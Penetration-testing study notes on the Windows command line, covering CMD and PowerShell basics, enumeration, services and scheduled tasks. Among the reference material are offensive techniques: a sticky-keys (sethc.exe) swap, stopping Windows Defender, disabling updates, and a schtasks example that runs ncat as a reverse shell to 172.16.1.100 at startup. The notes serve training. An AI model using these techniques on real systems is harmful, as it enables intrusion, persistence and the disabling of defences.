# Introduction to Windows Command Line
The scope of this module is how to navigate and administer a windows host from the commandline. These notes a written from a penetration testers perspective so the focus will be on reconnaissance, exploitation and exfiltration of data.

While tools exits to make navigating on windows machines easier for linux users, these tools usually leave traces on the host machine of our presence. What we instead can do is to "live of the land" which means using build-in commands and functionality to do our work, instead of relying on outside tools that may expose us.

## Cheat Sheet 
Useful commands will be listed in this table for the ease of use. 

### CMD
| Command | Purpose |
| ------- | --------| 
| dir | print directory |
| help  | displays a list of built-ins  |
| help \<commandName> |dispaly helpul information about the <commandName> |
| cls | clears the command prompt |
| systeminfo | prints information about the system | 
| ipconfig | shows networking information |
| doskey /history | prints a history of used commands | 
| cd | prints current working directory |
| cd \<dir>| change directory to the dir in argument | 
| tree | explore the file system tree with your current working directory as the root | 
| md or mkdir | creates a subdir in the current working directory with the name given in argument 1 |
| rd or rmdir | does the opposite of md and mkdir, it removes the directory specified in argument 1 |
| find "string" | like grep on Linux |
| del or erase | deletion tool | 

## Command Prompt vs Powershell
### Command Prompt
The command prompt was released in 1981 and have a lot of limitation compared to its younger brother "Powershell". Command Prompt does for example not support aliases for its command, it cannot pass command output to a new command.
Commands has to be run one at a time. 
* Output is pure text

### Powershell 
* Can use command aliases.
* cmdlet output can be passed to another cmdlet
* All output is in the form of an object
* Can execute a sequence of commands
* Has an integrated Scripting Enviroment 
* Works on Linux


## Command Prompt Basics
The command prompt binary is called cmd.exe or CMD.exe windows have a casual attitude towards capitalized letters. It is based on the COMMAND.COM interpreter in DOS.

### Access CMD
windows key + r type `cmd`
executing the executable from its path:
`C:\Windows\System32\cmd.exe`

### Basic Usage
Use the command `dir` to look around the the current directory, which should be denoted `C:\Users\<userName>`.   

#### Windows Recovery Trick
When booting from a windows installation disk we can initialize repair mode which launches a command prompt. From here we can overwrite the `sethc.exe` executeable with the `cmd.exe` now when we are at the login  screen we can press **shift** 5 times to open a command prompt with NT 

### Getting Help
When having trobule in the Command Prompt the `help` command is a useful tool with an argument is prints a list of system built-ins commands and gives a short despriction of their purpose. If you call the help command with another built-ins command as the argument it will display helpful information about the built-in command.

Some commands dont have a detailed section for the `help` command, but a reference to their own like `ipconfig` 
```
> help ipconfig

This command is not supported by the help utility. Try "ipconfig /?".
```

### History 
Come on, don't look at a mans CLI history... Well if you have to then use `doskey /history`
It will print a newline terminated list with previous commands regardless of the commands where valid or not. 

#### shortcuts
| key | description | 
| --- | ----------- |
| page up | Place the first command in the history | 
| page down | place the last command in the history | 
| up arrow | scroll one command back in the hisotry | 
| down arrow | scroll one command forward in the history |
| right arrow | Types the previous command one char at a time |
| F3 | retype previous command | 
| F5 | cycle through previous commands | 
| F7 | Opens an interactive list of previous commands |
| F9 | Enter a command to our prompt based on number, number corrosponds to commands in our history |

### Exit a Process
like with linux **ctrl + c** will abort a running process  

## System Navigation
we can use `cd` or `chdir` with arguments to print our current working directory.
To change directory we can add the directory we want to move to, to the 1st argument of `cd` to move there. 

Note that `C:\` is the root directory of a Windows machine. Historically drive A and B were for floppy disk so the thirds drive C was the harddrive. On modern computers there are no longer floppy disk slots but C:\ being the root of the windows system is still the case for legacy reasons.

Like Linux, Windows can also use relative and absolute pathing. Remember to note what drive you are in when using absolute paths. 

Using the `tree` command we can print a comprehensive view of the filesystem tree with our current working directory as the root of the tree.
with the `/F` parameter we can also get the files in the folders with the `tree` command

### Interesting Directories

| Name: |	Location:¨|	Description:|
|--|---|---
%SYSTEMROOT%\Temp |	C:\Windows\Temp |	Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. Useful for dropping files as a low-privilege user on the system. |
|%TEMP% |	C:\Users\<user>\AppData\Local\Temp |	Local directory containing a user's temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account.|
| %PUBLIC% |	C:\Users\Public |	Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity. |
|%ProgramFiles% |	C:\Program Files |	folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system. |
|%ProgramFiles(x86)% |	C:\Program Files (x86) |	Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.|


### Managing Directories
With the command `md <dirName>` we can create a directory. `md` is short for `mkdir` which performs the same operation.

we can remove directories with the `rd` or `rmdir` commands.

Trying to remove a non-empty directory will result in failure however. Unless given the paramter `/S`. 

#### Modify
Directories holds data, other directories, and files which also holds data. Therefore modifying them is a complex task that we let commands do for us:
* Move 
* Robocopy
* xcopy

`move <source> <destination>` like its Linux cousin `mv` we input 1st what we want to move, then as 2nd argument where we want to move it to.

`xcopy <source> <destination>` Like the name implies this command copies the source file to the destination. If given a directory xcopy will copy files and subdirectories however not empty subdirectories unless `/E` is given. xcopy will reset file and dir attributes unles the `/K` switch is passed.

`robocopy`is the successor of xcopy with more options and utilities. 
robocopy can move accross drives and networks while stile maintaining file data, attributes, ownership, ACLs, and any flags set like hidden or read-only.

If a user does not have permission to copy files we can use the `/MIR` switch, this will however mark the files as backup and hide them, which can be prevented with the `/A-:SH`(attribute show hidden). If you dont want to commit to the copy you can use the `/L` to see a preview of the operation without it executing, a good idea if you are not 100% certain of what you are doing. 

example:
`robocopy /E /MIR /A-:SH C:\Users\htb\Desktop\notes\ C:\Users\htb\Documents\Backup\Files-to-exfil\`

### Files
The `more` command displays the content of a file starting from the head until the terminal cannot show more, you can scroll further in the file with enter. Use the switch `/S` to crunch blanks spaces down to a single line.

outputs can be piped to more with the `|` symbol `ipconfig | more`

`openfiles` is an admin command that lets us see what files the users on our host has opened

`type` can display the contents of multiple text files at once. It uses a non locking operation to do so. 

`type` can also direct its output to other files `type secrets.txt >> exposed.txt`

#### Create and modify 
`echo` can be used to print something to the terminal and like on Linux can be used to write and append to a file 

`echo something > text.txt` 

`echo more things >> text.txt`

`fsutil` filesystem utility lets us create a file. 

`fsutil createNew for-sure.txt 222`

`ren` ren(ame) allows the user to rename a file (arg1) to something else (arg2)

#### Input / Output

**<, >, |, &** can be used to direct input and output to and from commands. 

**&&** can be used between two statemenets to run statement a and if it succeeds run b

**||** can be used similiarly but statement b only gets executed if a fails. 

#### Deleting Files
For deletion we can use `del` which also has the alias `erase`.  
```
> help erase
Deletes one or more files.

DEL [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names
ERASE [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names
  /P            Prompts for confirmation before deleting each file.
  /F            Force deleting of read-only files.
  /S            Delete specified files from all subdirectories.
  /Q            Quiet mode, do not ask if ok to delete on global wildcard
  /A            Selects files to delete based on attributes
  attributes    R  Read-only files            S  System files
                H  Hidden files               A  Files ready for archiving
                I  Not content indexed Files  L  Reparse Points
                O  Offline files              -  Prefix meaning not
```

#### Copying and moving files
cope and move can be used for these desired operations.
use /v to increase verbosity given you validation after the operation.

## System Information
Now that we have found our feet on a windows host it is time to **Gather System Information.**

In *any* offensive scenario it is important to enumerate the systems which are targeted. This can be done from outside but certainly also from the inside.

What kind of information could be interesting?

* General System Information
* Networking Information
* Basic Domain Information
* User Information

These are not the only types of information that can prove useful, but it does give us an idea of what kind of information that is relevant and what is not. 

**REMEMBER** to stay in scope! Your white hat can easily stain if you forget the scope and stick your nose in data you are not at liberty to see.

### How to get Information
#### The Big One
`systeminfo` I don't even have to tell you what this does, for you to know this might be useful command, right?

* Host-Name
* Operating Systen information
* Hardware Information
* Timezone
* Language(keyboard input, System)
* Hotfixes
* Network Card information

Thats a lot of information. 

#### The Others
`hostname` prints the hostname

`ver` what version of windows the system is running. 

`ipconfig` Network information

`arp /a` Prints the content of the systems Address Resolution Protocol cache 

`whoami` display the username of the user currently logged in. 

`whoami /priv` what are my priviledges

`whoami /groups`what groups am i part of 

`net user` display a list of all users on the host.

`net group` (only works on a windows domain controller) display information about groups on the host

`net localgroup` can be run on any windows host. Display information about groups on the host

`net share` view or create shared resources on the host.

`new view` 

## Finding Files and Directories

* `where` we can use where to find files that we input to it, if they exist in or cwd or paths. `where flag.txt` is a good one for CTF's
  * `where /R <path> <file> ` to find files Recursivly in a directory.
* `find <search-string> <path-to-file>` 
  * /V print any line that does NOT contain the search-string
  * /N print line number with the matched string
  * /I disable case sensitivity
* `findstr`is a grep like command
* `comp` compare files
* `fc` a more comprehensive tool for comparing files
* `sort` sort agr1 can be directed with the output switch /O 
  * `sort /unique` no dublets

## Environment Variables
`%SUPER_IMPORTANT_VARIABLE%` Capital letter with underscore for spacing is a standard, not a requirement for Environment Variables. 

Global vs Local Variables.
* Global: The data can be accessed from anywhere
* Local: The data can only be referenced inside the scope it was declared.

the `%WINDIR%` variable is a global variable that any user can call to get the path to the `Windows` directory.

If user A was to identify a variable like 
```
>set SECRET=FLAG{This_is_it!}
>echo %SECRET%
{This_is_it!}
```
But when i log in as user B
```
>echo %SECRET%
%SECRET%
```

Another type is scoping is the System scope and the user scope.

There is also the more volatile scope that is called the process scope. 

|Scope | 	Description |	Permissions Required to Access |	Registry Location |
| ----| ---- | ---- | ----- |
| System  (Machine) |	The System scope contains environment variables defined by the Operating System (OS) and are accessible globally by all users and accounts that log on to the system. The OS requires these variables to function properly and are loaded upon runtime. |	Local Administrator or Domain Administrator |	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment |
|User |	The User scope contains environment variables defined by the currently active user and are only accessible to them, not other users who can log on to the same system. |	Current Active User, Local Administrator, or Domain Administrator 	| HKEY_CURRENT_USER\Environment |
| Process |	The Process scope contains environment variables that are defined and accessible in the context of the currently running process. Due to their transient nature, their lifetime only lasts for the currently running process in which they were initially defined. They also inherit variables from the System/User Scopes and the parent process that spawns it (only if it is a child process).| 	Current Child Process, Parent Process, or Current Active User |	None (Stored in Process Memory)|

we can use `set` and `echo` to view the data in a variable.

### set and setx
`set` can be used to display, set and remove environment variables, but it only work in the current scope. 

`setx` makes permanent changes to the registry. 

#### Removing Varibales
setting a variable to an empty string is the way to delete them
`setx DCIP ""`

### Important Variables
| Variable Name | 	Description | 
|  --------- |  -------------- | 
| %PATH% | 	Specifies a set of directories(locations) where executable programs are located.| 
| %OS% | 	The current operating system on the user's workstation.| 
| %SYSTEMROOT% | 	Expands to C:\Windows. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files.| 
| %LOGONSERVER% | 	Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup.| 
| %USERPROFILE% | 	Provides us with the location of the currently active user's home directory. Expands to C:\Users\{username}.| 
| %ProgramFiles% | 	Equivalent of C:\Program Files. This location is where all the programs are installed on an x64 based system.| 
| %ProgramFiles(x86)% | 	Equivalent of C:\Program Files (x86). This location is where all 32-bit programs running under WOW64 are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (x86 vs. x64 architecture) | 

## Managing Services
The service controller program `sc` allows the user to: 
* Determine what services are running
* Modify existing services
* disable/ enable running services

`sc` works by giving it queries. We can query it by:
* process state
* process id
* service type

`sc query type= service` lists all running services ( Notice the space between `=` and "service" syntax wise this space is not optional! )

`sc query windefend` displays windefend also known as Windows Defender.

`sc stop windefend` stops the specified process, might require admin priviledges or even System.

`sc start windefend` starts the specified process, might require admin priviledges

we can also configure services with sc:
`sc config wuauserv start= disabled` we have now disabled this service (windows update) so it cant start.

if someone tries 
```
sc start wuauserv
[SC] StartService FAILED 1058:

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
``` 
This can be very useful if the host you are doing this on is running outdated software, which you intend to exploit.

you can undo the disabled command with a new start type `start= auto`

Remember to be careful. Disabling services is bound to be monitorized by a good blue team especially the essential services that comes with Windows. 

### Tasklist
`tasklist` can be used to print all running processe to the terminal. pipe with `| find "something"` to filter.
use the `/svc` switch to only list running services.


### Net Start
`net start` list all running services on our system. `net stop` `net pause` `net continue` are also valid commands with `net`.

### WMIC 
The Windows Management Instrumental Command is a big CLI executable with a lot of features. 
`wmic service list brief`
(This tool is however deprecated)

## Working with Scheduled Tasks
Scheduled Tasks is as the name implies: command(s) that are set to run in an automated frequency. 

These are great for automating maintainance on a system.
* Deleting old log files
* Taking backups 
* Health Checks

But they can also be used for malicious activities. Like persistance on a system. 

### Triggers That Can Kick Off a Scheduled Task
* When a specific system event occurs.
* At a specific time.
* At a specific time on a daily schedule.
* At a specific time on a weekly schedule.
* At a specific time on a monthly schedule.
* At a specific time on a monthly day-of-week schedule.
* When the computer enters an idle state.
* When the task is registered.
* When the system is booted.
* When a user logs on.
* When a Terminal Server session changes state.

### How to Utilize Scheduled Tasks 
`schtasks` 

### Query Syntax
| Action | 	Parameter |	Description |
| ----- | --------- |------------- |
|Query 	|	|Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.|
|	|/fo 	|Sets formatting options. We can specify to show results in the Table, List, or CSV output.|
||	/v 	|Sets verbosity to on, displaying the advanced properties set in displayed tasks when used with the List or CSV output parameter.|
||	/nh 	|Simplifies the output using the Table or CSV output format. This switch removes the column headers.|
||	/s 	|Sets the DNS name or IP address of the host we want to connect to. Localhost is the default specified. If /s is utilized, we are connecting to a remote host and must format it as "\\\host".|
||	/u 	|This switch will tell schtasks to run the following command with the permission set of the user specified.|
||	/p 	|Sets the password in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The u and p values are only valid when used with the s parameter.|

`SCHTASKS /Query /V /FO list` this command can be run with 

### Create Syntax
|Action |	Parameter |	Description |
| ----- | ------- | ---------- |
|Create |	|	Schedules a task to run.|
||	/sc |	Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.|
||	/tn |	Sets the name for the task we are building. Each task must have a unique name.|
||	/tr |	Sets the trigger and task that should be run. This can be an executable, script, or batch file.|
||	/s 	|Specify the host to run on, much like in Query.|
||	/u 	|Specifies the local user or domain user to utilize |
||	/p 	|Sets the Password of the user-specified.|
||	/mo |	Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day. |
||	/rl |	Allows us to limit the privileges of the task. Options here are limited access and Highest. Limited is the default value.|
||	/z |	Will set the task to be deleted after completion of its actions.|

Example:

`schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100 -e cmd.exe"` This scheduled task will triger on startup, be called "My Secret Task" and run ncat.exe with 172.16.1.100 (ip) and 8100 (port).

### Change Syntax
|Action |	Parameter |	Description|
|----- |	----- |	-----|
|Change| |		Allows for modifying existing scheduled tasks.|
||	/tn |	Designates the task to change|
||	/tr |	Modifies the program or action that the task runs.|
||	/ENABLE |	Change the state of the task to Enabled.|
||	/DISABLE |	Change the state of the task to Disabled.|

### Delete Syntax
|Action |	Parameter |	Description|
|------|---------|----------|
|Delete|| 		Remove a task from the schedule|
||	/tn| 	Identifies the task to delete.|
||	/s 	|Specifies the name or IP address to delete the task from.|
||	/u 	|Specifies the user to run the task as.|
||	/p 	|Specifies the password to run the task as.|
||	/f 	|Stops the confirmation warning.|


# CMD vs PowerShell
Up until now we have looked at the built-in windows command line cmd.exe. From now we will be looking at it successor PowerShell.

| Feature |	CMD |	PowerShell |
| ------ |------ |-----------|
|Language |	Batch and basic CMD commands only. |	PowerShell can interpret Batch, CMD, PS cmdlets, and aliases.|
|Command utilization |	The output from one command cannot be passed into another directly. |	The output from one command can be passed into another directly.|
|Command Output |	Text only |	PowerShell outputs in object formatting.|
|Parallel Execution |	CMD must finish one command before running another. |	PowerShell can multi-thread commands to run in parallel.|

PowerShell can be used to accomplish many task, among them:
*  Provisioning servers and installing server roles
*  Creating Active Directory user accounts for new employees
*  Managing Active Directory group permissions
*  Disabling and deleting Active Directory user accounts
*  Managing file share permissions
*  Interacting with Azure AD and Azure VMs
*  Creating, deleting, and monitoring directories & files
*  Gathering information about workstations and servers
*  Setting up Microsoft Exchange email inboxes for users (in the cloud &/or on-premises)

Powershell can be used from a terminal or Microsofts "IDE" Windows PowerShell Integrated Scripting Enviroment (ISE). 

## Prompt
Powershell commands use the `verb-noun` naming convention as you will see here.

`Get-Help` to get help with a cmdlet. 
the switch `-Online` can be used to source the help from the online repository instead of the local, ensuring the most up to date help.

`Update-Help` can be used to update the local `Get-Help` repository. 

### Navigating 
`Get-Location` print curret working directory.

`Get-ChildItem` Print items inside your current working directory.

`Set-Location` change directory works with both absolute and relative paths

`Get-Content` reads the content of a file.

`Get-Command` Can be used to find cmdlets to can remember the name of. 
  * `Get-Command -verb get`
  * `Get-Command -noun windows*`

So now we know how to `Get-Help`, `Get-Command`,`Get-Content`, `Get-Childitem` and how to `Set-Location`.

`Get-History` can be used to get a list of your previous commands, along with an ID
using `r <id>` you can rerun the command with the id provided. 

`Clear-Host` can clear the terminal. Aliases: `cls` `clear`

#### Hotkeys
|HotKey |	Description |
| ------- |--------- |
|CTRL+R |	It makes for a searchable history. We can start typing after, and it will show us results that match previous commands.|
|CTRL+L |	Quick screen clear.|
|CTRL+ALT+Shift+? |	This will print the entire list of keyboard shortcuts PowerShell will recognize.
Escape 	When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit escape, which will erase the line. |
|↑ |	Scroll up through our previous history.|
|↓ |	Scroll down through our previous history.|
|F7 |	Brings up a TUI with a scrollable interactive history from our session.|


### Aliases
PowerShell has alot of builtin aliases to make the transition from bash or cmd to PowerShell easier.

Aliases can be viewed with the `Get-Alias` cmdlet or its alias `gal`.

Set can also set aliases with `Set-Alias`. Here is an example of how it works:

`Set-Alias -Name gh -Value Get-Help` 

#### Helpful Aliases
You might recognize some of these builtin aliases from bash:
| Alias |	Description |
| ----- |------------ |
|pwd 	|gl can also be used. This alias can be used in place of Get-Location.|
|ls 	|dir and gci can also be used in place of ls. This is an alias for Get-ChildItem.|
|cd 	|sl and chdir can be used in place of cd. This is an alias for Set-Location.|
|cat 	|type and gc can also be used. This is an alias for Get-Content.|
|clear |	Can be used in place of Clear-Host.|
|curl 	|Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used.|
|fl and ft |	These aliases can be used to format output into list and table outputs.|
|man 	|Can be used in place of help.|


# CMDlets and Modules

## Cmdlets

Microsoft defines a cmdlet as: 
"a single-feature command that manipulates objects in PowerShell."

As mentioned earlier a cmdlet follow the Verb-Noun naming convention. 

cmdlets are not written in PowerShell but in C# or another compiled language. 

## PowerShell Modules
A module is structured PowerShell code, that is made easy to use and share. A module can consist of the following: 

* Cmdlets
* Script files
* Functions
* Assemblies
* Related resources (manifests and help files)

### Using PowerShell Modules
`Get-Module` will print a list of modules already loaded.

`Get-Module -ListAvailable` will list installed modules that have not yet been loaded.

`Import-Module` allows the user to add a module to the current session.

`Get-ExecutionPolicy` displays the execution policy use use`-list` to se the different scopes.

`Set-ExecutionPolicy` change the execution policy use `-scope Process` to limit it to the current powershell session.

`Get-Command -Module <moduleName>`  

### PowerShell Gallery and GitHub
Using the PowerShell Gallery or GitHub repositories you can find all sorts of modules you can use to enchance or tweak the PowerShell CLI to best match your needs.

With the builtin module PowerShellGet we can usee the command `Find-Module -Name <cmdname>` we can search for modules we want.
And with the pipe `|` symbol we can pipe the module into `Install-Module` to install it. 


# User and Group Management
User and group management is an integral part of a system administrator job. It is also typically an organizations biggest attack surface.  

## User Accounts
There are many accounts on a system which use different parts of the system. The types of accounts are:
* Service Accounts
* Built-in Accounts
* Local Users
* Domain Users

### Default Local User accout
| Account | Description | 
| -------- |---------- |
| Administrator | This account is used to accomplish administrative tasks on the local host. |
| Default Account | The Default Account is used by the system for running multi-user auth apps like the Xbox utility |
| Guest Account | This account is a limited rights account that allows users without a normal user account to access the host. It is disabled by default and should stay that way.|
| WDAGUtility Account | This account is in place for the Defender Application Guard, which can sandbox application sessions |

## Active Directory
Active Directory is a way to manage all computers in a domain from a central administration tool called the "Domain Controller"(DC). This way if user "Mike" needs his password reset. We do not have to go to the local user Mike in our entire organization (which theoritically could be a global organization). And manually reset the "Mike" user on each PC. 

### Local vs Domain Joined Users
Local users on a host is a user who has access to a subset of the resources on a host and has no special priviledges beyond the host. 

A domain User is a user who is recognized by all hosts and resources that adheer to the Domain Controller. This way even if user A has never logged into host B his password will still recognize the login credentials. This doesnt mean User A is given access since host B might be restricted to only special group members with priviledge. 

###  User Groups
User Groups are a way to granulate access to users in a standadized way. The logic is that a user can belong to many groups and a group can have many members. But this begs the question what does a group do for its members? Simple it grants access.

Using the example from before lets say that host B only allows logon for users who are part of group "admins-of-host-B", if we were to add User A to the group "admins-of-host-B" he would now be able to logon to host B. 

#### Add Remove Edit Users and Groups

* `Get-LocalGroup`
* `Get-LocalUser`
* `New-LocalUser`

By now the commands above should give you an idea of their intended use. 

